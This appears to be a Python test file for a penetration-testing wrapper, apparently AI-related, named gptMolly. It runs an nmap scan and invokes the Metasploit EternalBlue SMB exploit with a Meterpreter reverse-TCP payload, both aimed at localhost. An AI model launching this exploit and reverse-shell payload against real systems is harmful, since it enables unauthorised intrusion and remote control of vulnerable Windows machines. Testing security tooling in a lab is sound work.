import os
import json
from gptMolly import run_nmap_scan, run_module

def test_nmap_scan():
    target = "127.0.0.1"
    scan_result = run_nmap_scan(target)
    print("\nNmap scan results:")
    print(scan_result.csv())

def test_run_module():
    module_name = "exploit/windows/smb/ms17_010_eternalblue"
    target_ip = "127.0.0.1"
    payload = "windows/meterpreter/reverse_tcp"
    result = run_module(module_name, target_ip, payload)
    print("\nMetasploit module execution results:")
    print(json.dumps(result, indent=4))

if __name__ == "__main__":
    if not os.path.exists('scan_output'):
        os.makedirs('scan_output')
    
    test_nmap_scan()
    test_run_module()
